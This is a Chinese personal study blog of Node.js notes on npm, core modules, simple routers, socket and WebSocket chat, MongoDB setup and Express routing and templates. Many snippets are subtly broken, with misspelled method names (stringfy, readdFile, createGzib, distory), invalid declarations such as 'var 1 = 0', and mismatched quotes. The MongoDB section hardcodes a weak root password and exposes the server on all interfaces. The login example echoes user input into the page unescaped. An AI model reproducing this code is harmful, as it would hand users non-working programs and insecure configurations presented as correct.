显示主机名 第三方的Node.js模块(https://www.npmjs.com) ​ 把包用npm引进来（可以创建配置文件来管理npm init,根据情况填写回撤，会自动创建package.json） ​ 在命令行输入npm install request --save 安装在配置信息的依赖dependencies里 ​ 会在我们的包里面自动创建一个文件夹node_modules, 我们安装的包就会在里面了 ​ 载入模块同上 ​ 然后开始使用第三方模块 123456789const request = require('request') //自动先从自己的模块找，找不到就会到我们目录下配置文件夹下找request(&#123; url: 'https://api.douban.com/v2/movies/top250', json:true,&#125;, (error, response, body) =&gt; &#123; console.log(JSON.stringfy(body, null, 2));&#125;); 自定义的Node.js模块（要按照CommonJS规范） 新建一个目录src,里面新建一个js文件(模块) 1234567//自定义模块const hello = () =&gt;&#123; console.log("hello~");&#125;//暴露接口供外部使用(第一个hello是模块的名字，第二个hello是要用的方法)module.exports.hello = hello 调用 12const greet = require("./src/greeting.js")greet.hello() 三. NPM-包管理工具npm使用12npm -vnpm info 镜像源 12345# 查看npm config get registry# 设置npm config set registry http://registry.npmjs.org 升级node 12#npm install n -g 查看当前目录下安装了哪些node包 1npm ls 查看当前npm用户 1npm whoami npm清理缓存 1npm cache clean -f npm安装模块 12345678# i = installnpm i forever -g # 全局npm install xxx # 利用 npm 安装xxx模块到当前命令行所在目录；npm install -g xxx # 利用npm安装全局模块xxx；npm install xxx # 安装但不写入package.json；npm install xxx –save # 安装并写入package.json的”dependencies”中；npm install xxx –save-dev # 安装并写入package.json的”devDependencies”中。 npm 删除模块 12npm uninstall xxx # 删除xxx模块；npm uninstall -g xxx # 删除全局模块xxx； 更新模块 1npm update 检查模块是否已经过时 1npm outdated 在项目中引导创建一个package.json文件 1npm init 发布模块 1npm publish 查看node安装路径 1查看node安装路径 npm scripts 配置文件中 1234"scripts": &#123; "test": "echo \"Error: no test sspecified\" &amp;&amp; exit 1" "build": "node async.js"&#125;, 按照上面配置完之后，运行只需：npm run build 优点： 功能相同，可以使用同一个脚本 详细的下来查文档 四.深入浅出Node核心模块API1). url 记得要导入模块 1.parseurl.parse(urlStr, [parseQueryString], [slashesDenoteHost]) 12345678url.parse("https://www.baidu.com")# 井号后面是hashurl.parse("https://www.baidu.com:8080/api.php?from=xp&amp;course=node#level")#第二个参数 parseQueryString 为true时将使用查询模块分析查询字符串，默认为falseurl.parse("https://www.baidu.com"， true)#第三个参数 如果设置成true，//foo/bar 形式的字符串将被解释成 &#123; host: ‘foo', pathname: ‘/bar' &#125;url.parse("https://www.baidu.com"， true,true) 2.format将一个解析后的URL对象、转成、一个格式化的URL字符串。 url.format(urlObj) 123456789101112131415161718var url = require('url'); var a = url.format(&#123;protocol : 'http' ,auth : null ,host : 'example.com:8080' ,port : '8080' ,hostname : 'example.com' ,hash : null ,search : '?a=index&amp;t=article&amp;m=default',query : 'a=index&amp;t=article&amp;m=default',pathname : '/one',path : '/one?a=index&amp;t=article&amp;m=default',href : 'http://example.com:8080/one?a=index&amp;t=article&amp;m=default'&#125;);console.log(a); //输出结果：http://example.com:8080/one?a=index&amp;t=article&amp;m=default 3.resolve为URL或 href 插入 或 替换原有的标签，两段解析成一个完整的url url.resolve(from, to) 123456789var url = require('url');var a = url.resolve('/one/two/three', 'four') ,b = url.resolve('http://example.com/', '/one'),c = url.resolve('http://example.com/one', '/two');console.log(a +","+ b +","+ c);//输出结果：///one/two/four//http://example.com/one//http://example.com/two 2). QueryString1.querystring.escape(str)转义为url编码 1querystring.escape('&lt;大家好&gt;') 2.querystring.unescape(str)反转义 1querystring.unescape('%3C%E5%A4%A7%E5%AE%B6%E5%A5%BD%3E') 3.querystring.stringify(obj,[, seq[, eq[, options]]])序列化 12341. querystring.stringify(&#123;name:'chenshuai',ago:21,job:"web"&#125;)2. querystring.stringify(&#123;name:'chenshuai',ago:21,job:"web"&#125;,".") //第二个参数可以修改连接的&amp;3. querystring.stringify(&#123;name:'chenshuai',ago:21,job:"web"&#125;,".",":")//第三个参数可以修改key与value之间的字符串 4.querystring.parse(str[, sep[, eq[, options]]])反序列化 123456// querystring.parse('字符串','&amp;','=') //默认状态(字符串,分隔符,键与值)1. querystring.parse('name=chenshuai&amp;ago=21&amp;job=web')2.querystring.parse('name=chenshuai.ago=21.job=web','.')//返序列化时要注意格式3.querystring.parse('name:chenshuai.ago:21.job:web','.',':') 3).http(s) 模块1.get方法案例，http小爬虫 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657var http = require('http')var https = require('https') //https网站使用(和http的方法是一样的)var cherio = require('cherio') // 类似于jQueryvar url = "https://www.lagou.com"// 解析源代码function parseMenu(html)&#123; //先导入html，然后再进行处理 var $ = cherio.load(html) var menu = $('.category-list') var menuData = [] menu.each(function(index,value)&#123; //遍历 var menuTitle = $(value).find('h2').text() //一级标题 var menuLists = $(value).find('a') var menuList = [] menuLists.each(function(inde, val)&#123; //遍历 menuList.push($(val).text()) //a元素的text &#125;) menuData.push(&#123; menuTitle:menuTitle, menuList:menuList &#125;) &#125;) return menuData&#125;//打印function printMenu(menu)&#123; menu.forEach(function(val)&#123; console.log(val.menuTitle + '\n'); val.menuList.forEach(function(value)&#123; console.log(value); &#125;) &#125;)&#125;// get请求https.get(url, function(res)&#123; var html = ''; res.on('data', function(data)&#123; html += data; &#125;) res.on('end', function()&#123; // 打印的是网页源代码 //console.log(html); var result = parseMenu(html) printMenu(result) &#125;) res.on('error', function(err)&#123; console.log(err); &#125;)&#125;) 2.Request方法GET获取异步数据 12345678910111213141516171819202122232425262728//Http模块的request方法的get来获取异步数据 豆瓣电影Top250const https = require('https')var options = &#123; hostname: 'douban.uieee.com', port: 443, method: 'GET', path: '/v2/movie/top250'&#125;var responseData = ''var request = https.request(options, (response) =&gt;&#123; response.setEncoding('utf8') response.on('data', (chunk)=&gt;&#123; responseData += chunk &#125;) response.on('end',()=&gt;&#123; JSON.parse(responseData).subjects.map((item) =&gt;&#123; console.log(item.title); // 第一页的电影标题 &#125;) &#125;)&#125;)request.on('error', (error)=&gt;&#123; console.log(error);&#125;)request.end() POST方法提交表单 123456789101112131415161718192021222324252627282930313233343536373839404142434445//Http模块的request方法的post方法提交表单const http = require('http')const qs = require('querystring')//序列化var postData = querystring.stringfy(&#123; 'question[title]':'哈哈哈', 'question[content]':'我的内容'&#125;)var options = &#123; hostname: 'www.codingke.com', port: 80, method: 'POST', path: '/ajax/course/question' headers: &#123; // 因为登录之后才能提交，所有这里... 'Cookie':'xxxx', 'User-Agent':'xxxx', 'xxx':'xxx', 'Content-Length':postData.length &#125;&#125;var request = http.request(options, (res) =&gt;&#123; console.log('Status:' + res.statusCode); res.setEncoding('utf8') res.on('data', (chunk)=&gt;&#123; console.log(chunk); &#125;) res.on('end',()=&gt;&#123; console.log("表单提交完毕"); &#125;)&#125;)//提交表单request.write(postData)request.on('error', (error)=&gt;&#123; console.log(error);&#125;)request.end() 4). Events事件模块使用事件: EventEmitter类 事件的参数 只执行一个的事件监听器 比如：更新、发布 都是一个事件 小例子: 12345678910111213141516171819202122232425262728293031const EventEmitter = require('events')class Player extends EventEmitter&#123;&#125; //继承类//实例化对象var player = new Player()//自定义一个函数(不过我这里是用的匿名函数)function ev1()&#123; console.log("嘻嘻");&#125;//监听事件(这里用的匿名函数)player.on('play', (track)=&gt;&#123; console.log(`正在播放: 《$&#123;track&#125;》`);&#125;)// emit订阅事件，传递参数player.emit('play',"被风吹过的夏天")//事件定义之后，可以多次触发player.emit('play',"朋友请听好")// once 不论你定义几次，只会触发一次player.once('play',"陈情令")// removeListener 移除指定的监听事件//player.removeListener('')// removeAllListeners 移除所有的监听事件// eventNames方法可以罗列出已注册的所有监听器的事件，类型为数组 5). fs 文件系统得到文件与目录信息：stat 创建一个目录：mkdir 创建文件并写入内容：writeFile,appendFile 读取文件的内容：readFile 列出目录的东西：readdir 重命名目录或文件：rename 删除目录与文件：rndir,unlink 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102const fs = require('fs')fs.stat('index.js', (error,stats) =&gt; &#123; if(error)&#123; console.log(error); &#125;else&#123; console.log(stats); //打印文件的一些信息 console.log(`文件：$&#123;stats.isFile()&#125;`); console.log(`目录：$&#123;stats.isDirectory()&#125;`); &#125;&#125;)//新建目录fs.mkdir('logs' (error) =&gt;&#123; if(error)&#123; console.log(error); &#125;else&#123; console.log("成功创建目录: logs"); &#125;&#125;)// 往文件写内容(如果文件不存在，就先创建)fs.writeFile('logs/hello.log', "hello ~\n" , (error) =&gt;&#123; if(error)&#123; console.log(error); &#125;else&#123; console.log("成功向文件logs/hello.log写入内容 "); &#125;&#125;)// 修改文件内容fs.writeFile('logs/hello.log', "你好 ~\n" , (error) =&gt;&#123; if(error)&#123; console.log(error); &#125;else&#123; console.log("成功修改文件logs/hello.log内容 "); &#125;&#125;)// 追加文件内容fs.appendFile('logs/hello.log', "新添加的一行 ~\n" , (error) =&gt;&#123; if(error)&#123; console.log(error); &#125;else&#123; console.log("成功添加内容文件logs/hello.log "); &#125;&#125;)// 读取文件内容fs.readdFile('logs/hello.log','utf8', (error,data) =&gt;&#123; if(error)&#123; console.log(error); &#125;else&#123; console.log("成功读取文件logs/hello.log内容"); console.log(data); //console.log(data.toString()); &#125;&#125;)// 读取文件夹列表fs.readdir('logs/', (error,data) =&gt;&#123; if(error)&#123; console.log(error); &#125;else&#123; console.log("成功读取文件夹logs/列表 "); console.log(data); //console.log(data.toString()); &#125;&#125;)//对文件重命名 、修改文件夹名字一样fs.rename('logs/hello.log', "logs/hello_new.log" , (error) =&gt;&#123; if(error)&#123; console.log(error); &#125;else&#123; console.log('重命名文件名logs/hello.log "); &#125;&#125;)//循环删除文件fs.readdirSync('logs').map((file) =&gt;&#123; fs.unlink(`logs/$&#123;file&#125;`, (error) =&gt;&#123; if(error)&#123; console.log(error); &#125;else&#123; console.log(`成功删除文件logs/$&#123;file&#125;`); &#125; &#125;)&#125;)//删除文件夹fs.rmdir('logs', (error) =&gt;&#123; if(error)&#123; console.log(error); &#125;else&#123; console.log('成功删除目录:logs/ "); &#125;&#125;) 6). Stream文件流 12345678910111213141516171819202122232425const fs = require('fs')var fileReadStrem = fs.createReadStream('data.json')var fileWriteStrem = fs.createWriteStream('data1.json')var count = 0;//读取文件流fileReadStrem.once('data', (chunk) =&gt; &#123; console.log(chunk.toString());&#125;)fileReadStrem.on('data', (chunk) =&gt; &#123; console.log(`$&#123; ++count &#125; 接收到：$&#123;chunk.length&#125;`); //写入文件流 fileWriteStrem.write(chunk)&#125;)fileReadStrem.on('end', () =&gt; &#123; console.log("-- 结束 --");&#125;)fileReadStrem.on('error', (error) =&gt; &#123; console.log(error);&#125;) pipe 1234567891011121314const fs = require('fs')const zlib = require('zlib')var fileReadStrem = fs.createReadStream('data.json')var fileWriteStrem = fs.createWriteStream('data1.json')fileWriteStrem.on('pipe', (source) =&gt; &#123; console.log(source); //将写入的内容通过管道打印一下&#125;)//读取文件流的内容放到文件写入流 管道fileReadStrem .pipe(zlib.createGzib()) .pipe(fileWriteStrem) 五.使用Node创建后端路由使用supervisor运行 12345# 安装：npm install supervisor -g# 运行supervisor router_1.js 最简单路由 router_1.js 123456789101112131415161718192021var http = require('http')var url = require('url')var route = require('./modules/route.js')http.createServer((req, res) =&gt; &#123; res.writeHead(200, &#123;'Content-Type':'text/html;charset=utf-8'&#125;) if(req.url !== '/favicon.ico')&#123; var pathName = url.parse(req.url).pathname.replace(/\//,'') //http://localhost:8000/login就是login console.log(pathName); try&#123; //最简单的异常处理 route[pathName](req, res) &#125; catch(err)&#123; route['home'](req, res) //默认路由，如果不存在哪个路由，就返回这个路由 &#125; &#125; res.end()&#125;).listen(8000)console.log('Server running at http://localhost:8000'); route.js 1234567891011module.exports = &#123; home: (req, res) =&gt; &#123; res.write("欢迎来到首页") // 默认路由 &#125;, login: (req, res) =&gt; &#123; res.write("登录界面") // 处理路由 &#125;, registor: (req, res) =&gt; &#123; res.write("注册界面") // 处理路由 &#125;&#125; 读取图片 router_02.js 123456789101112131415161718192021var http = require('http')var url = require('url')var route = require('./modules/route.js')http.createServer((req, res) =&gt; &#123; res.writeHead(200, &#123;'Content-Type':'image/jpeg'&#125;) if(req.url !== '/favicon.ico')&#123; var pathName = url.parse(req.url).pathname.replace(/\//,'') //http://localhost:8000/login就是login console.log(pathName); try&#123; //最简单的异常处理 route[pathName](req, res) &#125; catch(err)&#123; route['home'](req, res) //默认路由，如果不存在哪个路由，就返回这个路由 &#125; &#125; //res.end()&#125;).listen(8000)console.log('Server running at http://localhost:8000'); route.js 1234567891011121314151617var file = require('./file.js')module.exports = &#123; home: (req, res) =&gt; &#123; res.write("欢迎来到首页") // 默认路由 &#125;, login: (req, res) =&gt; &#123; res.write("登录界面") // 处理路由 &#125;, registor: (req, res) =&gt; &#123; res.write("注册界面") // 处理路由 &#125;, img: (req, res) =&gt; &#123; //读取文件，也新建一个模块 file.readImg('./images/1.jpg', res) &#125;&#125; file.js 123456789101112var fs = require('fs')module.exports = &#123; readImg: (file, res) =&gt; &#123; fs.readFile(file, 'binary', (err, data) =&gt; &#123; if(err) throw err; res.writeHead(200, &#123;'Content-Type':'image/jpeg'&#125;) res.write(data, 'binary') res.end() &#125;) &#125;&#125; 文字和图片一起显示 使用html文件 views/home.html 1234567891011&lt;!&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;首页&lt;/title&gt; &lt;/head&gt; &lt;body&gt; 首页 &lt;img src="./img" alt=""&gt; &lt;/body&gt;&lt;/html&gt; file.js 1234567891011121314151617181920var fs = require('fs') //读html文件module.exports = &#123; readFile: (file, res) =&gt; &#123; fs.readFile(file, 'utf-8', (err, data) =&gt; &#123; if(err) throw err; res.writeHead(200, &#123;'Content-Type':'text/html; charset=utf-8'&#125;) res.write(data) res.end() &#125;)&#125;, readImg: (file, res) =&gt; &#123; fs.readFile(file, 'binary', (err, data) =&gt; &#123; if(err) throw err; res.writeHead(200, &#123;'Content-Type':'image/jpeg'&#125;) res.write(data, 'binary') res.end() &#125;) &#125;&#125; route.js 12345678910111213141516171819var file = require('./file.js')module.exports = &#123; home: (req, res) =&gt; &#123; //res.write("欢迎来到首页") // 默认路由 file.readFile('./views/home.html', res) &#125;, login: (req, res) =&gt; &#123; res.write("登录界面") // 处理路由 &#125;, registor: (req, res) =&gt; &#123; res.write("注册界面") // 处理路由 &#125;, img: (req, res) =&gt; &#123; //读取文件，也新建一个模块 file.readImg('./images/1.jpg', res) &#125;&#125; router_03.js 1234567891011121314151617181920var http = require('http')var url = require('url')var route = require('./modules/route.js')http.createServer((req, res) =&gt; &#123; if(req.url !== '/favicon.ico')&#123; var pathName = url.parse(req.url).pathname.replace(/\//,'') console.log(pathName); try&#123; //最简单的异常处理 route[pathName](req, res) &#125; catch(err)&#123; route['home'](req, res) //默认路由，如果不存在哪个路由，就返回这个路由 &#125; &#125; //res.end()&#125;).listen(8000)console.log('Server running at http://localhost:8000'); 路由传递参数1.get方式 login.html 12345678910&lt;form action="./login" method="get"&gt; &lt;label for="email"&gt; 邮箱: &lt;input type="text" name="email" value=""/&gt; &lt;/label&gt; &lt;label for="password"&gt; 密码: &lt;input type="password" name="password" value=""/&gt; &lt;/label&gt; &lt;label for="submit"&gt; &lt;input type="submit" value="提交" /&gt; &lt;/label&gt; toute.js 1234567891011var file = require('./file.js')var url = require('url')module.exports = &#123; login: (req, res) =&gt; &#123; var urlObject = url.parse(req.url, true).query // 通过url解析html表单数据 console.log(urlObject.email) console.log(urlObject.password) file.readFile('./views/login.html', res, req) &#125;&#125; 2.post方式 route.js 123456789101112131415161718192021var file = require('./file.js')var url = require('url')var queryString = require('queryString')module.exports = &#123; login: (req, res) =&gt; &#123; //post方式 var post = '' req.on('data', (chunk) =&gt; &#123; post += chunk &#125;) req.on('end', () =&gt; &#123; var urlObject = queryString.parse(post) //返回一个url对象 console.log(urlObject.email); console.log(urlObject.password); &#125;) file.readFile('./views/login.html', res, req) &#125;&#125; 输入的内容回显到本页面 file.js 123456789101112131415161718192021222324 postReadFile: (file, res, req, post) =&gt;&#123; var urlObject = queryString.parse(post) var array = ['email', 'password'] var reg; fs.readFile(file, 'utf-8', (err, data) =&gt; &#123; if(err) throw err; res.writeHead(200, &#123;'Content-Type':'text/html; charset=utf-8'&#125;) //处理 for(var i=0; i&lt;array.length; i++)&#123; reg = new RegExp('&#123;' + array[i] + '&#125;', 'gi') data = data.replace(reg, urlObject[array[i]]) &#125; if(urlObject.email &amp;&amp; urlObject.password)&#123; data = data.replace(new RegExp('&#123;infoClass&#125;', 'gi'), '') data = data.replace(new RegExp('&#123;formClass&#125;', 'gi'), 'hide') &#125;else&#123; data = data.replace(new RegExp('&#123;infoClass&#125;', 'gi'), 'hide') data = data.replace(new RegExp('&#123;formClass&#125;', 'gi'), '') &#125; res.write(data) res.end() &#125;)&#125;, route.js 12345678910login: (req, res) =&gt; &#123; //post方式 var post = ''; req.on('data', (chunk) =&gt; &#123; post += chunk &#125;) req.on('end', () =&gt; &#123; file.postReadFile('./views/login.html', res, req, post) &#125;)&#125;, login.html 1234567891011121314&lt;div class="&#123;infoClass&#125;"&gt; Email:&#123;email&#125; &lt;br&gt; 密码:&#123;password&#125;&lt;/div&gt;&lt;form action="./login" method="post" class="formClass"&gt; &lt;label for="email"&gt; 邮箱: &lt;input type="text" name="email" value=""/&gt; &lt;/label&gt; &lt;label for="password"&gt; 密码: &lt;input type="password" name="password" value=""/&gt; &lt;/label&gt; &lt;label for="submit"&gt; &lt;input type="submit" value="提交" /&gt; &lt;/label&gt; asyncnpm install async -D 常用功能: 1234567891011121314151617181920//1.串行无关联(第一个参数是数组，第二个参数是个回调函数)//运行时间是两个运行时间总和console.time('test')async.series([ (callback) =&gt; &#123; //数组的第一个元素 setTimeout(()=&gt;&#123; callback(null,'one') &#125;,200) &#125;, (callback)=&gt;&#123; //数组的第一个元素 setTimeout(()=&gt;&#123; callback(null,'two') &#125;,5000) &#125;],(err, results) =&gt; &#123; // 第二个参数 console.log(results); console.timeEnd('test') //看一下执行时间&#125;) 1234567891011121314151617// 2.串行无关联(第二种用法，第一个参数是对象)console.time('test')async.series(&#123; one: (callback) =&gt; &#123; setTimeout(() =&gt; &#123; callback(null, '1') &#125;,2000) &#125;, two: (callback) =&gt; &#123; setTimeout(() =&gt; &#123; callback(null, '2') ,3000) &#125; &#125;, (err, results) =&gt; &#123; console.log(results); console.timeEnd('test')&#125;) 123456789101112131415161718// 3.并行无关联（第一个参数是数组）//时间取最长的async.parallel([ (callback) =&gt; &#123; setTimeout( ()=&gt;&#123; callback(null, 'one') &#125;,2000) &#125;, (callback) =&gt; &#123; setTimeout( ()=&gt;&#123; callback(null, 'two') &#125;,5000) &#125;,], (err,results)=&gt;&#123; console.log(results); console.timeEnd('test') //运行时间5s，取最长的&#125;)//也可以第一个参数是对象 123456789101112131415// 4.串行有关联async.waterfall([ function (callback)&#123; callback(null,'one','two') &#125;, function (arr1,arr2,callback)&#123; callback(null, arr1,arr2,'three') &#125;, function (arr1,arr2,arr3,callback)&#123; callback(null, [arr1,arr2,arr3,'done']) &#125;],function(err,results)&#123; console.log(results);&#125;)//这里没加异步，按照串行顺序依次下来的 六. Socket 1). 基于net模块实现socket聊天案例 server.js 1234567891011121314151617181920212223242526272829303132333435363738var net = require('net')var chatServer = net.createServer(), clientMap = new Object()var i = 0; //客户端连接流水号chatServer.on('connection', function (client)&#123; client.name = ++i clientMap[client.name] = client console.log("客户端 "+ client.name +" 连接成功~"); //对客户端发送消息的监听 client.on('data', function (data)&#123; console.log("客户端传来：" + data); broadcast(data, client) //广播给其他 &#125;) //数据错误的处理 client.on('error', function (err)&#123; console.log("client error: " + err); client.end() &#125;) //客户端关闭事件 client.on('close', function (data)&#123; delete clientMap[client.name] console.log(client.name + "下线了"); broadcast(client.name+"下线了", client) //广播给其他 &#125;)&#125;)chatServer.listen(9000) //监听端口//消息广播function broadcast (message, client)&#123; for(var key in clientMap)&#123; clientMap[key].write(client.name + ' say:' + message + "\n") &#125;&#125; client.js 123456789101112131415161718192021222324252627282930313233343536373839404142var net = require('net')var port = 9000var host = '127.0.0.1'var client = new net.Socket()client.setEncoding = 'UTF-8'//连接服务器client.connect(port, host, function () &#123; client.write("您好")&#125;)//监听服务端消息client.on('data', function (data) &#123; console.log("服务端传来：" + data); say()&#125;)client.on('error', function (err)&#123; console.log(err);&#125;)client.on('close', function (err)&#123; console.log('connection closed');&#125;)const readline = require('readline')const r1 = readline.createInterface(&#123; input: process.stdin, //标准输入 output: process.stdout&#125;)function say() &#123; r1.question('请输入：', (inputStr =&gt; &#123; if (inputStr != 'bye')&#123; client.write(inputStr + '\n') &#125;else&#123; client.distory() //关闭连接 r1.close() &#125; &#125;))&#125; 2). 浏览器原生支持的WebSocketnpm install ws 案例同上 server.js 1234567891011121314151617181920212223242526var wbsocketServer = require('ws').Server, wss = new wbsocketServer(&#123;port:9001&#125;)var clientMap = new Object()var i=0wss.on('connection', function (ws)&#123; ws.name = ++i clientMap[ws.name] = ws console.log(ws.name + " 上线了"); ws.on('message', function (message)&#123; broadcast(message, ws) &#125;) ws.on('close', function (message)&#123; // global.gc() //调用内存回收 console.log(ws + " 离开"); &#125;)&#125;)//广播方法function broadcast(msg, ws)&#123; for(var key in clientMap)&#123; clientMap[key].send(ws.name + '说：' + msg) &#125;&#125; client.js 12345678910111213141516171819var WebSocket = require('ws')var ws = new WebSocket('ws://127.0.0.1:9001/')ws.onopen = function () &#123; ws.send('大家好')&#125;ws.onmessage = function (event) &#123; var chatroom = document.getElementById('chatroom') chatroom.innerHtml += '&lt;/br&gt;' + event.data&#125;ws.onclose = function () &#123; alert('Closed')&#125;ws.onerror = function (err) &#123; alert('Error:' + err)&#125; chat.html 12345678910111213141516171819202122&lt;body&gt;&lt;div id="chatroom"&gt;&lt;/div&gt;&lt;input type="text" name="sayinput" id="sayinput" value=""&gt;&lt;input type="button" name="send" id="sendbutton" value="发送"&gt;&lt;script src="client.js"&gt;&lt;/script&gt;&lt;script type="text/javascript"&gt; function send()&#123; ws.send(sayinput.value) sayinput.vaule = "" &#125; document.onkeyup = function(event)&#123; if (event.keycode == 13)&#123; send() &#125; &#125; sendbutton.onclick = function ()&#123; send() &#125;&lt;/script&gt;&lt;/body&gt; 3). socket.io实现socket当浏览器不支持html5时，就不能用websocket了 借助express实现: npm i express socket.io socket_io.js 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758var app = require('express')()var http = require('http').Server(app)vat io = require('socket.io')(http)var fs = require('fs')app.get('/', (req,res)=&gt;&#123; function callback(data) &#123; res.send(data.toString()) &#125; fs.readFile('socketIOClient.html', function (err, data)&#123; if(err)&#123; console.log(err); console.log("文件不存在"); &#125;else&#123; callback(data) &#125; &#125;)&#125;)// app.get('/socket.io.js')//socket.io的设置//在线用户var onlineUsers = &#123;&#125;//在线人数var onlineCount = 0var 1 = 0io.on('connection', function (socket)&#123; console.log("有人上线了"); //监听新用户加入 socket.name = i onlineUsers[socket.name] = socket //监听用户退出 socket.on('disconnect', function ()&#123; console.log("有人退出了"); delete onlineUsers[socket.name] &#125;) //监听用户发布的聊天内容 socket.on('message', function (msg)&#123; broadcast(msg, socket) &#125;)&#125;)//广播方法function broadcast(msg, socket)&#123; for(var key in onlineUsers)&#123; onlineUsers[key].send(socket.name + '说：' + msg) &#125;&#125;http.listen(9002, function ()&#123; console.log("");&#125;) html 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;&lt;/title&gt; &lt;style&gt; #chatroom&#123; width:400px; height:600px; overflow:auto; border:1px solid bule &#125; &lt;/style&gt; &lt;script src="./socket.io.js"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;script type="text/javascript"&gt; var iosocket = null; windows.onload = function ()&#123; iosocket = io.connect('http://127.0.0.1/9002') iosocket.on('connect'. function ()&#123; iosocket.send('hello, from inclient') &#125;) //接收数据 iosocket.on('message', function (message)&#123; var chatroom = document.getElementById("chatroom"); chatroom.innerHtml += message = '&lt;/br&gt;' &#125;) //断开连接 iosocket.on('disconnect', function ()&#123; console.log("服务端关闭"); &#125;) function send()&#123; iosocket.send(sayinput.value) sayinput.value = "''" &#125; document.onkeyup = function(event)&#123; if (event.keycode == 13)&#123; send() &#125; &#125; sendbutton.onclick = function ()&#123; send() &#125; &#125; &lt;/script&gt; &lt;div id="chatroom"&gt;&lt;/div&gt; &lt;input type="text" name="sayinput" id="sayinput" value=""&gt; &lt;input type="button" name="send" id="sendbutton" value="发送"&gt; &lt;/body&gt;&lt;/html&gt; 七.MongoDB安装(Linux下)1. 通过公钥对资源包一致性和真实性进行验证： 12sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv 9DA31620334BD75D9DCB49F368818C72E52529D4 2. 运行下行命令，创建文件/etc/apt/sources.list.d/mongodb-org-4.0.list： 1echo "deb [ arch=amd64 ] https://repo.mongodb.org/apt/ubuntu bionic/mongodb-org/4.0 multiverse" | sudo tee /etc/apt/sources.list.d/mongodb-org-4.0.list 3. 在安装之前，先更新系统资源包： 1sudo apt-get update 4. 安装mongodb资源包： 12345# 安装MongoDB serversudo apt-get install -y mongodb-org # 安装MongoDB 客户端sudo apt-get install mongodb-clients 4. 检验是否安装成功： 启动mongod服务： 1234sudo service mongod start #查看mongo版本:mongo --version 5.登录MongoDB并设置密码 123456# 登录mongo# 切换到admin数据库use admin# 创建admin账号，密码::admin111 权限：root权限，授权的数据库名：admindb.createUser(&#123;user:"admin", pwd:"admin111", roles:[&#123;role:"root", db:"admin"&#125;]&#125;) 编辑MongoDB配置文件 12345678vim /etc/mongod.confnet: port: 27017 # 端口 bindIp: 0.0.0.0 # 允许访问的地址，0.0.0.0表示所有security: authorization: enabled 重启MongoDB服务 1systemctl restart mongod.service 测试登录 1mongo -u admin -p admin111 --authenticationDatabase admin 学习 与mysql语法对比：https://www.jb51.net/article/65626.htm?tdsourcetag=s_pctim_aiomsg 术语、概念 MongoDB集合 一个数据库可以有多个集合(对应mysql的table) MongoDB文档 键值对 如：{&#39;name&#39;:&#39;xps&#39;, &#39;like&#39;:[&#39;code&#39;,&#39;play&#39;]} MongoDB数据类型 常用命令1.数据库操作查看帮助 1234helpdb.help()db.test.help()df.test.find().help() 创建/切换数据库 1use music # 如果不存在就创建，存在且切换 查询数据库 123456show dbs # 当数据库为空时，是不显示的# 我们向一个集合里面插入一个文档db.user.insertOne(&#123;'name':'xps','like':['code','play']&#125;)# 查看集合里面的文档(行)db.user.find() 查看当前使用的数据库 123db#db.getName() 显示当前DB状态 1db.stats() 查看当前DB版本 1db.version() 查看当前DB的链接机器地址 1db.getMongo() 删除数据库 1db.dropDatabase() 2.集合（Collection）操作….写了半天，忘了保存，算了，放图片吧…. 3.文档操作对集合内数据增删改查 删除 123db.user.remove(&#123;'name':'xps'&#125;)db.user.delete(&#123;'name':'xps'&#125;)db.user.deleteMany(&#123;'name':'xps'&#125;) 八. Express框架 一个node.js的web框架 1). 准备安装 npm install express --save, Windows下还有:npm install -g express-generator express -h 测试安装成功 新建项目：express test_express 目录结构： package.js是需要的依赖，切换到项目根目录手动安装npm install app.js是入口 www/bin下面是端口等配置 启动项目： 1npm start 2). Express初始化项目详解一些模块 12345678910"dependencies": &#123; //"body-parser": "~1.15.2", // 解析前端提交的数据 "cookie-parser": "~1.4.4", //解析cookie "debug": "~2.6.9", // 用来显示调试信息 //"ejs": "~2.5.2", //模板，渲染页面 "express": "~4.16.1", "http-errors": "~1.6.3", "jade": "~1.11.0", //模板，渲染页面 "morgan": "~1.9.1" //日志，控制后格式化显示信息&#125; bin/www入口文件 实现了创建服务和中间件、路由配置 12345678normalizePort() 方法，对端口进行简单处理1.路由中间件2.自定义中间件（app.set('port', port)这样）app.use() app.js 12app.use(express.static(path.join(__dirname, 'public'))); //设置静态文件路径... 12var usersRouter = require('./routes/users');app.use('/users', usersRouter); router/xxx.js 路由的中间件 12 //这里的index就是view下面的index.jaderes.render(&apos;index&apos;, &#123; title: &apos;Express&apos; &#125;); //渲染模板 ， index不用写后缀名 12345678910#比如 index.jsvar express = require('express');var router = express.Router();// get('/', xxx) 因为前面写了/user，所以这里只写/即可router.get('/', function(req, res, next) &#123; res.send('respond with a resource');&#125;);module.exports = router; // 暴露出去，才能以中间件的形式存在 views/xxx.jade 模板文件 3). Express中的路由users.js 123456789101112131415161718192021222324252627282930313233343536var express = require('express');var router = express.Router();/* GET users listing. */router.get('/', function(req, res, next) &#123; res.send('respond with a resource');&#125;);// 第二层路由，第一层在app.js里router.get('/list', function(req, res) &#123; res.send('user list');&#125;);// 可以写成表达式（正则）router.get('/a*d', function(req, res) &#123; res.send('表达式路由');&#125;);//转到一个文件router.get('/form', function(req, res) &#123; res.sendFile(__dirname + '/form.html')&#125;);//post请求router.post('/save', function(req, res) &#123; res.send("表单提交!")&#125;);// all， post和get都接收router.all('/all',function(req, res) &#123; res.send("post和get都接收!")&#125;);module.exports = router; form.html 123456789&lt;form action="/users/save" method="post" class="formClass"&gt; &lt;label for="username"&gt; username: &lt;input type="text" name="username" value=""/&gt; &lt;/label&gt; &lt;label for="submit"&gt; &lt;input type="submit" value="提交" /&gt; &lt;/label&gt;&lt;/form&gt; 4). Express中的模板ejs/jade等 ejs比较简单 123456789101112131415161718192021222324#安装（express内置了ejs）npm install ejs --save#配置ejs模板引擎app.set('view engine','ejs')#渲染页面render(filename,json)接收两个参数。#如下app.get('/learnejs',function(req,res)&#123; let arr=['吃饭','睡觉','打豆豆'] res.render('index',&#123; list_a:arr 